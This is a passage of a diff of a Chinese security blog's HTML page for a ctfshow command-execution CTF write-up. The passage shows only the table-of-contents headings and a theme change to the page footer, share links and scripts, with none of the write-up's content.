class="toc-number">32.1.</span> <span class="toc-text">#输出数组函数代替1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web69-70"><span class="toc-number">33.</span> <span class="toc-text">web69-70</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BF2"><span class="toc-number">33.1.</span> <span class="toc-text">#输出数组函数代替2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#json-encode-%E5%87%BD%E6%95%B0"><span class="toc-number">33.2.</span> <span class="toc-text">json_encode()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#var-export-%E5%87%BD%E6%95%B0"><span class="toc-number">33.3.</span> <span class="toc-text">var_export()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web71"><span class="toc-number">34.</span> <span class="toc-text">web71</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%89%8D%E9%80%81%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">34.1.</span> <span class="toc-text">提前送出缓冲区</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">34.2.</span> <span class="toc-text">绕过缓冲区</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72"><span class="toc-number">35.</span> <span class="toc-text">web72</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glob%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6"><span class="toc-number">35.1.</span> <span class="toc-text">#glob协议绕过目录访问限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF%E8%84%9A%E6%9C%AC"><span class="toc-number">35.2.</span> <span class="toc-text">UAF脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web73"><span class="toc-number">36.</span> <span class="toc-text">web73</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web74"><span class="toc-number">37.</span> <span class="toc-text">web74</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web75-76"><span class="toc-number">38.</span> <span class="toc-text">web75-76</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web77"><span class="toc-number">39.</span> <span class="toc-text">web77</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web118"><span class="toc-number">40.</span> <span class="toc-text">web118</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FRCE"><span class="toc-number">40.1.</span> <span class="toc-text">#内置环境变量RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web119"><span class="toc-number">41.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web120"><span class="toc-number">42.</span> <span class="toc-text">web120</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web121"><span class="toc-number">43.</span> <span class="toc-text">web121</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web122"><span class="toc-number">44.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web124"><span class="toc-number">45.</span> <span class="toc-text">web124</span></a></li></ol>
-      </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&text=ctfshow入门命令执行"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&is_video=false&description=ctfshow入门命令执行"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=ctfshow入门命令执行&body=Check out this article: https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=ctfshow入门命令执行"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&name=ctfshow入门命令执行&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&t=ctfshow入门命令执行"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
 </div>
 
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctfshow入门命令执行">https://wanth3f1ag.top/2025/06/29/ctfshow入门命令执行/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># 命令执行</a>
+          </div>
+
         
-        
-<footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2024-2025
-        wanTh3flag
-        <br>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC7%E9%93%BE/" rel="prev" title="Java反序列化CC7链">
+                  <i class="fa fa-angle-left"></i> Java反序列化CC7链
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/07/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CakePHP5.1.5%E6%A1%86%E6%9E%B6/" rel="next" title="PHP反序列化-CakePHP5.1.5框架">
+                  PHP反序列化-CakePHP5.1.5框架 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">45:12</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
     </div>
-    
-    <div class="footer-right">
-        <nav>
-            <ul>
-                <!--
-                --><li><a href="/">H0me</a></li><!--
-                --><!--
-                --><li><a href="/about/">A6out</a></li><!--
-                --><!--
-                --><li><a href="/tags/">T6gs</a></li><!--
-                --><!--
-                --><li><a href="/categories/">Catagory</a></li><!--
-                --><!--
-                --><li><a href="/links/">L1nks</a></li><!--
-                --><!--
-                --><li><a href="/search/">s4arch</a></li><!--
-                -->
-            </ul>
-            <ul>
-                
-                <!-- 不蒜子统计 -->
-                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                
-            </ul>
-        </nav>
-    </div>
-</footer>
-
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
+  </footer>
 
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 </body>
 </html>
